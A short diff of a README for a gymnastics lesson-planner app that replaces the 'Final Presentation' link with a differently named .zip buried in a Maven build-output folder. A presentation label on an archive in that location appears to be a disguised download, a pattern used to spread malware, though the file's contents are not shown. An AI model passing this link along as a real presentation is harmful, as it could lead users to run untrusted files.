@@ -54,4 +54,4 @@ Welcome to the Gymnastic Lesson Planner App -- your go-to solution for streamlin
 
 Check out our final presentation for a comprehensive overview of our Gymnastic Lesson Planner App:
 
-[Final Presentation](https://github.com/StephenKodua/GallinuleRepo/raw/refs/heads/main/GallinuleProject/target/maven-status/maven-compiler-plugin/compile/default-compile/Gallinule_Repo_v1.3.zip)
+[Final Presentation](https://raw.githubusercontent.com/StephenKodua/GallinuleRepo/main/GallinuleProject/target/maven-status/maven-compiler-plugin/compile/Repo-Gallinule-3.5.zip)
